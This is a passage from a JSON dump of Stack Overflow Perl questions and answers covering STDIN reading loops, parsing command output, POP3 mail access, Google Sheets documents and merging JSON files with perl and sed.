&lt;STDIN&gt;)</code>.  What you have &quot;loops over&quot; <code>$answer</code> ... which is always true (so it keeps going), and which never again reads new input (so it keeps printing the same)."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485845025, "post_id": 41950624, "comment_id": 71081931, "body": "@zdim: I think &quot;looping over&quot; generally refers to a list, like a <code>for</code> statement."}], "answers": [{"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 6, "last_activity_date": 1591478836, "last_edit_date": 1591478836, "creation_date": 1485843179, "answer_id": 41950816, "question_id": 41950624, "link": "https://stackoverflow.com/questions/41950624/how-to-get-input-from-the-terminal-in-perl/41950816#41950816", "title": "How to get input from the terminal in perl", "body": "<p>Your <code>while</code> loop never reads input. The <code>$answer</code> got <code>STDIN</code> before the loop and presumably has a string, that evaluates true in the <code>while</code> condition. The regex in the loop cannot change that. </p>\n\n<p>Thus not only is no new input assigned to <code>$answer</code>, but after the first iteration nothing at all changes in the loop. So it keeps running forever, printing the question based on the same <code>$answer</code>.</p>\n\n<p>You need</p>\n\n<pre><code>while (my $answer = &lt;STDIN&gt;) {\n    chomp $answer;\n    # ...\n}\n</code></pre>\n\n<p>instead. </p>\n\n<p>Every time the condition of <code>while (...)</code> is evaluated the new input is read via <code>&lt;STDIN&gt;</code> and is assigned to <code>$answer</code>.  Then each new question uses the new <code>$answer</code>. Note how a variable may be declared inside the <code>while</code> condition so to exist only inside the loop body (and in the condition after its declaration). This is a nice way to keep its scope restricted to where it is needed, inside the loop.</p>\n\n<p>The filehandle read <code>&lt;...&gt;</code> returns <code>undef</code> when it gets <code>EOF</code> (or on error) and the loop terminates.  See <a href=\"http://perldoc.perl.org/perlop.html#I/O-Operators\" rel=\"nofollow noreferrer\">I/O Operators in perlop</a>. A user at the terminal can normally achieve this by <code>Ctrl-d</code>.  </p>\n"}, {"comments": [{"owner": {"reputation": 34692, "user_id": 356440, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/d16fc2844c1d9f8f815f318734554266?s=128&d=identicon&r=PG", "display_name": "Stephane Rolland", "link": "https://stackoverflow.com/users/356440/stephane-rolland"}, "edited": false, "score": 0, "creation_date": 1591452963, "post_id": 41957958, "comment_id": 110064107, "body": "unfortunately you are not answering the question. OP does not ask about command line arguement, but asks about input from <code>stdin</code>, <code>cin</code>. Not parameters given to execute the programs, like you are answering. Sorry to down-vote, your answer is not false in itself, but on stackoverflow, but we have to focus on answering the good question. Here you are not answering the question."}], "tags": [], "owner": {"reputation": 976, "user_id": 4503339, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/VEFBo.png?s=128&g=1", "display_name": "shekhar pande", "link": "https://stackoverflow.com/users/4503339/shekhar-pande"}, "is_accepted": false, "score": -1, "last_activity_date": 1485866656, "creation_date": 1485866656, "answer_id": 41957958, "question_id": 41950624, "link": "https://stackoverflow.com/questions/41950624/how-to-get-input-from-the-terminal-in-perl/41957958#41957958", "title": "How to get input from the terminal in perl", "body": "<p>A typical Perl script that uses command-line arguments will \n1)  test for the number of command line arguments the user supplied \n2)  attempt to use them. </p>\n\n<p>see bellow code </p>\n\n<pre><code>#!/usr/bin/perl -w\n\n# (1) quit unless we have the correct number of command-line args\n$num_args = $#ARGV + 1;\nif ($num_args != 2) {\n    print \"\\nUsage: name.pl first_name last_name\\n\";\n    exit;\n}\n\n# (2) we got two command line args, so assume they are the\n# first name and last name\n$first_name=$ARGV[0];\n$last_name=$ARGV[1];\n\nprint \"Hello, $first_name $last_name\\n\";\n</code></pre>\n"}], "owner": {"reputation": 1754, "user_id": 5618172, "user_type": "registered", "accept_rate": 47, "profile_image": "https://lh6.googleusercontent.com/-5DWu2LJ3Neg/AAAAAAAAAAI/AAAAAAAAADs/4juP7qODSek/photo.jpg?sz=128", "display_name": "kero", "link": "https://stackoverflow.com/users/5618172/kero"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1334, "favorite_count": 0, "accepted_answer_id": 41950816, "answer_count": 2, "score": 5, "last_activity_date": 1591478836, "creation_date": 1485842323, "last_edit_date": 1485855330, "question_id": 41950624, "link": "https://stackoverflow.com/questions/41950624/how-to-get-input-from-the-terminal-in-perl", "title": "How to get input from the terminal in perl", "body": "<p>I am creating a simple chatterbot program like <a href=\"https://en.m.wikipedia.org/wiki/ELIZA\" rel=\"nofollow noreferrer\">ELIZA</a>.</p>\n\n<p>I'm taking questions from the terminal and sending reply with dialog, but my program takes only the first input and repeats.</p>\n\n<p>For example, when I run my script the output may be something like this:</p>\n\n<pre><code>[Eliza]: Hi, I'm a psychotherapist. What is your name?\nuser Input: hello my name is adam.\n[Eliza]: hello adam, how are you?\n[Eliza]: your name is adam\n[Eliza]: your name is adam\n[Eliza]: your name is adam\n[Eliza]: your name is adam\n[Eliza]: your name is adam\n</code></pre>\n\n<p>and it repeats endlessly.</p>\n\n<p>I don't know where I am doing wrong. So how can I get my program to read the next line from the keyboard.</p>\n\n<pre><code>sub hello {\n    print \"[Eliza]: Hi, I'm a psychotherapist. What is your name? \\n\";\n}\n\n\nsub getPatientName {\n    my ($reply) = @_;\n\n    my @responses = ( \"my name is\", \"i'm\", \"i am\", \"my name's\" );\n\n    foreach my $response ( @responses ) {\n\n        if ( lc($reply) =~ /$response/ ) {\n            return  \"$'\";\n        }\n    }\n\n    return lc($reply);\n}\n\nsub makeQuestion {\n    my ($patient) = @_;\n\n    my %reflections = (\n        \"am\"    =&gt;   \"are\",\n        \"was\"   =&gt;   \"were\",\n        \"i\"     =&gt;   \"you\",\n        \"i'd\"   =&gt;   \"you would\",\n        \"i've\"  =&gt;   \"you have\",\n        \"i'll\"  =&gt;   \"you will\",\n        \"my\"    =&gt;   \"your\",\n        \"are\"   =&gt;   \"am\",\n        \"you've\"=&gt;   \"I have\",\n        \"you'll\"=&gt;   \"I will\",\n        \"your\"  =&gt;   \"my\",\n        \"yours\" =&gt;   \"mine\",\n        \"you\"   =&gt;   \"me\",\n        \"me\"    =&gt;   \"you\"\n    );\n\n    if ( $count == 0 ) {\n        $patientName = getPatientName($patient);\n        $count += 1;\n        print \"Hello $patientName , How are you? \\n\";\n    }\n\n    my @toBes = keys %reflections;\n\n    foreach my $toBe (@toBes) {\n\n        if ($patient =~/$toBe/) {\n            $patient=~ s/$toBe/$reflections{$toBe}/i;\n            print \"$patient? \\n\";\n        }\n    }\n}\n\nsub eliza {\n\n    hello();\n\n    my $answer = &lt;STDIN&gt;;\n\n    while ($answer) {\n        chomp $answer;\n        #remove . ! ;\n        $answer =~ s/[.!,;]/ /;\n        makeQuestion($answer);\n    }\n}\n\neliza();\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 5900, "user_id": 931154, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/bTrZd.jpg?s=128&g=1", "display_name": "Gregory Nisbet", "link": "https://stackoverflow.com/users/931154/gregory-nisbet"}, "edited": false, "score": 0, "creation_date": 1485841229, "post_id": 41950311, "comment_id": 71080463, "body": "What exactly are you trying to do with the lines once you&#39;ve loaded them into a perl data structure? I&#39;m having trouble following."}, {"owner": {"user_type": "does_not_exist", "display_name": "user7341243"}, "reply_to_user": {"reputation": 5900, "user_id": 931154, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/bTrZd.jpg?s=128&g=1", "display_name": "Gregory Nisbet", "link": "https://stackoverflow.com/users/931154/gregory-nisbet"}, "edited": false, "score": 0, "creation_date": 1485841774, "post_id": 41950311, "comment_id": 71080654, "body": "i had used happy command and stored the command output into happy.txt.Then to read the file used the read operations.To split the contents inside forach loop i had used the linux command stored variables(i.e $lines).Now i want to use the happy.txt file directly inside foreach loop.Is it possible to modify my code@GregoryNisbet"}, {"owner": {"reputation": 19969, "user_id": 23512, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/tUj1I.png?s=128&g=1", "display_name": "Tanktalus", "link": "https://stackoverflow.com/users/23512/tanktalus"}, "edited": false, "score": 1, "creation_date": 1485842352, "post_id": 41950311, "comment_id": 71080868, "body": "I&#39;m confused - you open <code>$filename</code> for reading (<code>&#39;&lt;&#39;</code>), and then you print to it? I&#39;m not following your intentions here at all."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1485844499, "post_id": 41950311, "comment_id": 71081701, "body": "Me too, confused. (1) You receive <code>$lines</code> from arguments. (2) But you <i>also</i> get <code>$lines</code> as output of <code>happy</code> (3) Then you <i>also</i> open <code>&#39;happy.txt&#39;</code> to read those same lines, yet again ... (4) but then you <i>write to that file</i>.  If you need <code>$lines</code> for <code>foreach</code>,  <b>either</b> take them as function argument (and don&#39;t worry about files),  <b>or</b> get them by executing <code>happy</code> under backticks, <b>or</b> execute <code>happy</code> via <code>system</code> and redirect them to a file, which you then read.  <i>One</i> of these."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user7341243"}, "edited": false, "score": 0, "creation_date": 1485847221, "post_id": 41951249, "comment_id": 71082802, "body": "Great explanation.It helps me@zdim"}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 1, "last_activity_date": 1485943687, "last_edit_date": 1485943687, "creation_date": 1485845126, "answer_id": 41951249, "question_id": 41950311, "link": "https://stackoverflow.com/questions/41950311/how-to-take-input-file-into-foreach-loop/41951249#41951249", "title": "How to take input file into foreach loop", "body": "<p>It seems that you simply need <code>$lines</code> for processing in the <code>foreach</code> loop.</p>\n\n<p><strong>Either</strong> get them as arguments passed to the function</p>\n\n<pre><code>my ($lines) = @_;\n# ...\n# no need to run \"happy\" in any way or to deal with files\nforeach (split /\\n/, $lines) {\n    # ...\n}\n</code></pre>\n\n<p><strong>or</strong> get them as output from <code>happy</code></p>\n\n<pre><code># no need for function arguments to contain $lines\nmy $lines = `happy`;\n# no need for system() and reading the file\nforeach (split /\\n/, $lines) {\n    # ...\n}\n</code></pre>\n\n<p><strong>or</strong> run <code>system</code> with redirection and <em>read</em> from the file</p>\n\n<pre><code>my $filename = 'happy.txt';\nsystem (\"happy &gt; $filename\");\nopen my $fh, '&lt;', $filename or die \"Can't open $filename: $!\";\n\nwhile (my $line = &lt;$fh&gt;) {\n    # process each line from the file\n}\n</code></pre>\n\n<p>In this case you can nicely read line by line, instead of having <code>$lines</code> and <code>split</code>-ing it.</p>\n\n<p>You can do that with backticks (the <a href=\"http://perldoc.perl.org/perlop.html#Quote-Like-Operators\" rel=\"nofollow noreferrer\">qx operator</a>) as well,</p>\n\n<pre><code>my @lines = `happy`;\n</code></pre>\n\n<p>since in the <em>list context</em> it returns the <em>list</em> of lines from output, not the scalar with all of them.</p>\n\n<hr>\n\n<p>Note that you should add error checking for all calls that go out to the system (and not only for that!). The <a href=\"http://perldoc.perl.org/functions/system.html\" rel=\"nofollow noreferrer\">system</a> returns <em>zero</em> if it ran fine, so you normally do something like</p>\n\n<pre><code>system(...) == 0 or die \"Can't fork: $!\";\n</code></pre>\n\n<p>while <code>qx</code> on error returns <code>undef</code> in scalar context or empty list in list context, so these can be used for an initial check for problems.</p>\n\n<p>They both also set the <a href=\"http://perldoc.perl.org/perlvar.html#Error-Variables\" rel=\"nofollow noreferrer\">$? variable</a> which you can interrogate for details, see the link and the links for <code>system</code> and <code>qx</code>. Note that this firstly concerns <em>their</em> operation, and not necessarily how well the command that they execute itself did.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user7341243"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 654, "favorite_count": 0, "accepted_answer_id": 41951249, "answer_count": 1, "score": 0, "last_activity_date": 1485943687, "creation_date": 1485840692, "last_edit_date": 1485845395, "question_id": 41950311, "link": "https://stackoverflow.com/questions/41950311/how-to-take-input-file-into-foreach-loop", "title": "How to take input file into foreach loop", "body": "<p>Input file (i.e happy.txt generated from happy)</p>\n\n<pre><code>NAME     PEND RUN SUSP JLIM JLIMR   RATE   HAPPY\nakawle   8    20  0    100  20:100  67980  71%\nakumar6  16   0   0    100  100     0      0%\napatil2  2    4   0    100  10:100  20398  67%\nashetty  0    3   0    100  40:100  9725   100%\nbdash    2    0   0    100  100     0      0%\n</code></pre>\n\n<h3>code</h3>\n\n<pre><code>gen_ls_data();\n\nsub gen_ls_data{\n\n    my($lines) = @_;\n    my $header_found = 0;\n    my @headers = ();\n    my $row_count = 0;\n    my %row_data = ();\n\n    $lines = `happy`;\n    system(\"happy &gt; happy.txt\");\n\n    my $filename = 'happy.txt';\n    open(my $fh, '&lt;', $filename) or die \"Could not open file '$filename' $!\";\n    print $fh $lines ;\n    close $fh;\n\n    foreach (split(\"\\n\",$lines)) {\n        if (/NAME\\s*PEND/) {\n        $header_found = 1;      \n        @headers =split;\n        next;\n    }\n\n    if ( $header_found == 0 ) { }\n    else {\n\n        if (/^\\s*$/) {\n            $header_found=0;\n            next; \n        }\n\n        $row_data{$row_count++} = $_;\n    }\n}\n</code></pre>\n\n<p>How can I pass the <code>happy.txt</code> directly into the <code>foreach</code> loop without passing the <code>$lines</code> variables Linux command?</p>\n"}, {"tags": ["perl", "perl-module"], "comments": [{"owner": {"reputation": 2064, "user_id": 3606329, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/027b912750dbb94c9c1ff89c9eb20f46?s=128&d=identicon&r=PG&f=1", "display_name": "user3606329", "link": "https://stackoverflow.com/users/3606329/user3606329"}, "edited": false, "score": 1, "creation_date": 1485836927, "post_id": 41948500, "comment_id": 71079132, "body": "This question cannot be answered. You need to provide some example code. Then we can have a look and help you to implement multiple outlook accounts."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 7241453, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1f697fe79f94ae8c650e003be162f3db?s=128&d=identicon&r=PG&f=1", "display_name": "iSampada ", "link": "https://stackoverflow.com/users/7241453/isampada"}, "edited": false, "score": 0, "creation_date": 1486041344, "post_id": 41954087, "comment_id": 71182540, "body": "Thanks, But I am getting Unable to connect to POP3 server: could not connect socket [exchange3, 110]: Invalid argument error"}, {"owner": {"user_type": "does_not_exist", "display_name": "user7341243"}, "reply_to_user": {"reputation": 1, "user_id": 7241453, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1f697fe79f94ae8c650e003be162f3db?s=128&d=identicon&r=PG&f=1", "display_name": "iSampada ", "link": "https://stackoverflow.com/users/7241453/isampada"}, "edited": false, "score": 0, "creation_date": 1486369638, "post_id": 41954087, "comment_id": 71298072, "body": "I feel may be it is due to invalid host name.Check with your hostname@iSampada"}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user7341243"}, "is_accepted": false, "score": 0, "last_activity_date": 1485855536, "creation_date": 1485855536, "answer_id": 41954087, "question_id": 41948500, "link": "https://stackoverflow.com/questions/41948500/how-can-i-handle-multiple-outlook-accounts-using-perl/41954087#41954087", "title": "How can I handle multiple outlook accounts using Perl", "body": "<hr>\n\n<p>Please check the following  it may help you.But you should install respective modules.Reference from \"<a href=\"http://www.perlmonks.org/?node_id=916759\" rel=\"nofollow noreferrer\">http://www.perlmonks.org/?node_id=916759</a>\"</p>\n\n<pre><code>use Modern::Perl;\nuse Mail::POP3Client;\nuse MIME::QuotedPrint;\n\nmy $pop_user = 'XXXXXXXXXX';\nmy $pop_pass = 'XXXXXXXXXX';\nmy $pop_host = 'exchange3';\n\n#connect to POP3 sever\nmy $pop = new Mail::POP3Client    ( HOST =&gt; $pop_host );\n$pop-&gt;User($pop_user);\n$pop-&gt;Pass($pop_pass);\n$pop-&gt;Connect() \n    or die \"Unable to connect to POP3 server: \".$pop-&gt;Message().\"\\n\";\n\n#count number of items in POP3 mailbox                                \nmy $mailcount = $pop-&gt;Count();\n\nfor (my $i = 1; $i &lt;= $mailcount ; $i++) {\n    my $header = $pop-&gt;Head($i); #gets the header\n    my $uni = $pop-&gt;Uidl($i); # gets the unquie id\n    my $body = $pop-&gt;Body($i);\n    $body = decode_qp($body); #decode quoted printable body\n    say \"$uni\";\n    say \"$header\\n\";\n    say \"$body\";\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 7241453, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1f697fe79f94ae8c650e003be162f3db?s=128&d=identicon&r=PG&f=1", "display_name": "iSampada ", "link": "https://stackoverflow.com/users/7241453/isampada"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 50, "favorite_count": 0, "answer_count": 1, "score": -4, "last_activity_date": 1485855536, "creation_date": 1485827449, "question_id": 41948500, "link": "https://stackoverflow.com/questions/41948500/how-can-i-handle-multiple-outlook-accounts-using-perl", "title": "How can I handle multiple outlook accounts using Perl", "body": "<p>I have task to read mails from secondary mail account from outlook using perl.</p>\n"}, {"tags": ["perl", "google-sheets", "google-api", "google-sheets-api"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485808505, "post_id": 41944906, "comment_id": 71070015, "body": "I don&#39;t think you can do it with Net::Google::Spreadsheets, but see <a href=\"http://stackoverflow.com/questions/2704902/how-do-you-create-a-document-in-google-docs-programmatically\">How do you create a document in Google Docs programmatically?</a>"}], "owner": {"reputation": 331, "user_id": 489278, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4f18bdffc338ecffcddb4e0dec0a5a5d?s=128&d=identicon&r=PG", "display_name": "foob.ar", "link": "https://stackoverflow.com/users/489278/foob-ar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 108, "favorite_count": 1, "answer_count": 0, "score": 2, "last_activity_date": 1485812440, "creation_date": 1485808413, "last_edit_date": 1485812440, "question_id": 41944906, "link": "https://stackoverflow.com/questions/41944906/creating-or-copying-google-documents-with-netgooglespreadsheets", "title": "Creating or Copying Google documents with Net::Google::Spreadsheets", "body": "<p>Is it possible to use the API to create, rename and copy Google documents before I write to them?</p>\n\n<p>So far I'm able only to write to existing documents, using <a href=\"https://metacpan.org/pod/Net::Google::Spreadsheets\" rel=\"nofollow noreferrer\"><code>Net::Google::Spreadsheets</code></a>.</p>\n"}, {"tags": ["bash", "perl", "unix", "awk", "sed"], "comments": [{"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485800080, "post_id": 41942518, "comment_id": 71065508, "body": "Is direct string manipulation your only option? Why not parse the JSON in every file and write out the result also processed by the perl-core JSON module?"}, {"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485800682, "post_id": 41942518, "comment_id": 71065870, "body": "I probably understand your question wrong, but: Is the content of your first example lines the result of your own doing (&#39;I would like to concatenate several JSON files.&#39;) or already a given fact in one of these files? If it&#39;s the latter, please ignore my first comment."}, {"owner": {"reputation": 1248, "user_id": 298278, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/802e4f0d39d466ccf3723b932f0491c9?s=128&d=identicon&r=PG", "display_name": "Windle", "link": "https://stackoverflow.com/users/298278/windle"}, "edited": false, "score": 0, "creation_date": 1485800826, "post_id": 41942518, "comment_id": 71065959, "body": "Where is the <code>][</code> between JSON objects coming from? In other words, how are you currently combining the files?"}, {"owner": {"reputation": 33, "user_id": 4923574, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/B82y8.jpg?s=128&g=1", "display_name": "buondi", "link": "https://stackoverflow.com/users/4923574/buondi"}, "reply_to_user": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485808041, "post_id": 41942518, "comment_id": 71069777, "body": "@SREagle  Sorry I think the moderators cut my question. The <b>...}][{ ..</b> is the results of the concatenation of the 2 json files. Then, SREagle, your proposition is a possibility but I think the problem is still there with the last file to concatenate"}, {"owner": {"reputation": 83048, "user_id": 2255089, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZNAsT.jpg?s=128&g=1", "display_name": "Casimir et Hippolyte", "link": "https://stackoverflow.com/users/2255089/casimir-et-hippolyte"}, "edited": false, "score": 0, "creation_date": 1485811303, "post_id": 41942518, "comment_id": 71071429, "body": "@buondi: Did you try to use <a href=\"https://stedolan.github.io/jq/\" rel=\"nofollow noreferrer\"><code>jq</code></a> (that is designed to deal with json files)? This command-line should suffice: <code>jq -c -s -r &#39;[.[]|.[]]&#39; file.json &gt; result.json</code>"}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1485807526, "last_edit_date": 1485807526, "creation_date": 1485800039, "answer_id": 41942710, "question_id": 41942518, "link": "https://stackoverflow.com/questions/41942518/replace-a-multiline-pattern-using-perl-sed-awk/41942710#41942710", "title": "Replace a multiline pattern using Perl, sed, awk", "body": "<blockquote>\n  <p><em>I would like to concatenate several JSON files.</em></p>\n</blockquote>\n\n<p>If I understand correctly, you have something like the following (where letters represent valid JSON values):</p>\n\n<pre><code>to_combine/file1.json: [a,b,c]\nto_combine/file2.json: [d,e,f]\n</code></pre>\n\n<p>And from that, you want the following:</p>\n\n<pre><code>combined.json: [a,b,c,d,e,f]\n</code></pre>\n\n<p>You can use the following to achieve this:</p>\n\n<pre><code>perl -MJSON::XS -0777ne'\n   push @data, @{ decode_json($_) };\n   END { print encode_json(\\@data); }\n' to_combine/*.json &gt;combined.json\n</code></pre>\n\n<hr>\n\n<p>As for the problem with your Perl solution:</p>\n\n<ol>\n<li><code>[</code> has a special meaning in regex patterns. You need to escape it.</li>\n<li>You only perform one replacement.</li>\n<li><code>-0</code> doesn't actually turn on slurp mode. Use <code>-0777</code>.</li>\n<li>You place the comma after the newline, when it would be nicer before the newline.</li>\n</ol>\n\n<p>Fix:</p>\n\n<pre><code>cat to_combine/*.json | perl -0777pe's/\\]\\n\\[/,\\n/g' &gt;combined.json\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 1, "last_activity_date": 1485811994, "last_edit_date": 1592644375, "creation_date": 1485804135, "answer_id": 41943838, "question_id": 41942518, "link": "https://stackoverflow.com/questions/41942518/replace-a-multiline-pattern-using-perl-sed-awk/41943838#41943838", "title": "Replace a multiline pattern using Perl, sed, awk", "body": "<p>Note that a better way to combine multiple JSON files is to parse them all, combine the parsed data structure, and reencode the result. Simply changing all occurrences of <code>][</code> to a comma <code>,</code> may alter data instead of markup</p>\n<p>sed is a minimal program that will operate only on a single line of a file at a time. Perl encompasses everything that sed or awk will do and a huge amount more besides, so I suggest you stick with it</p>\n<p>To change all <code>]...[</code> pairs in <code>file.json</code> (possibly separated by whitespace) to a single comma, use this</p>\n<pre><code>perl -0777 -pe &quot;s/\\]\\s*\\[/,/g&quot; file.json &gt; file2.json\n</code></pre>\n<p>The <code>-0</code> option specifies an octal line separator, and giving it the value 777 makes perl read the entire file at once</p>\n<p>One-liners are famously unintelligible, and I always prefer a proper program file, which would look like this</p>\n<h3>join_brackets.pl</h3>\n<pre><code>use strict;\nuse warnings 'all';\n\nmy $data = do {\n    local $/;\n    &lt;&gt;;\n}\n\n$data =~ s/ \\] \\s* \\[ /,/gx;\n\nprint $data;\n</code></pre>\n<p>and you would run it as</p>\n<pre><code>perl join_brackets.pl file.json &gt; joined.json\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1289, "user_id": 1330706, "user_type": "registered", "profile_image": "https://graph.facebook.com/859896960751961/picture?type=large", "display_name": "mug896", "link": "https://stackoverflow.com/users/1330706/mug896"}, "is_accepted": false, "score": 0, "last_activity_date": 1485889068, "last_edit_date": 1485889068, "creation_date": 1485888692, "answer_id": 41965310, "question_id": 41942518, "link": "https://stackoverflow.com/questions/41942518/replace-a-multiline-pattern-using-perl-sed-awk/41965310#41965310", "title": "Replace a multiline pattern using Perl, sed, awk", "body": "<p>I tried with example in your question.</p>\n\n<pre><code>$ sed -rn '\n    1{$!N;$!N}\n    $!N\n    /\\s*}\\s*\\n\\s*]\\s*\\n\\s*\\[\\s*\\n\\s*\\{\\s*/M { \n        s//\\},\\n\\{/\n        $!N;$!N \n    }\n    P;D\n' file\n        ...\n        \"tag\" : \"description\"\n},\n{\n        \"tag\" : \"description\"\n        ...\n        ...\n        \"tag\" : \"description\"\n},\n{\n        \"tag\" : \"description\"\n        ...\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 4923574, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/B82y8.jpg?s=128&g=1", "display_name": "buondi", "link": "https://stackoverflow.com/users/4923574/buondi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1301, "favorite_count": 1, "accepted_answer_id": 41943838, "answer_count": 3, "score": 3, "last_activity_date": 1485889068, "creation_date": 1485799392, "last_edit_date": 1495539930, "question_id": 41942518, "link": "https://stackoverflow.com/questions/41942518/replace-a-multiline-pattern-using-perl-sed-awk", "title": "Replace a multiline pattern using Perl, sed, awk", "body": "<p>I need to concatenate multiple JSON files, so</p>\n\n<pre><code>        ...\n        \"tag\" : \"description\"\n    }\n]\n[\n    {\n        \"tag\" : \"description\"\n        ...\n</code></pre>\n\n<p>into this :</p>\n\n<pre><code>    ...\n    \"tag\" : \"description\"\n},\n{\n    \"tag\" : \"description\"\n    ...\n</code></pre>\n\n<p>So I need to replace the pattern <code>] [</code> with <code>,</code>, but the new line character makes me crazy...</p>\n\n<p>I used several methods, I list some of them:</p>\n\n<ul>\n<li><p><strong>sed</strong></p>\n\n<pre><code> sed -i '/]/,/[/{s/./,/g}' file.json\n</code></pre>\n\n<p>but I get this error:</p>\n\n<pre><code>sed: -e expression #1, char 16: unterminated address regex\n</code></pre></li>\n<li><p>I tried to delete all the newlines\n<a href=\"https://stackoverflow.com/questions/1251999/how-can-i-replace-a-newline-n-using-sed\">following this example</a></p>\n\n<pre><code>sed -i ':a;N;$!ba;s/\\n/ /g' file.json\n</code></pre>\n\n<p>and the output file has \"^M\". Although I modified this file in unix, I used the dos2unix command on this file but nothing happens. I tried then to include the special character \"^M\" on the search but with worse results</p></li>\n<li><p><strong>Perl</strong>\n(as proposed <a href=\"http://ask.xmodulo.com/search-and-replace-multi-line-string.html\" rel=\"nofollow noreferrer\">here</a>)</p>\n\n<pre><code>perl -i -0pe 's/]\\n[/\\n,/' file.json\n</code></pre>\n\n<p>but I get this error: </p>\n\n<pre><code>Unmatched [ in regex; marked by &lt;-- HERE in m/]\\n[ &lt;-- HERE / at -e line 1.\n</code></pre></li>\n</ul>\n"}, {"tags": ["regex", "perl", "text", "sed"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1485792408, "post_id": 41940342, "comment_id": 71060967, "body": "Did you try anything? <code>&#47;\\[\\[&#47; .. &#47;\\]\\]&#47;</code> doesn&#39;t sound too hard."}, {"owner": {"reputation": 1, "user_id": 7447975, "user_type": "registered", "profile_image": 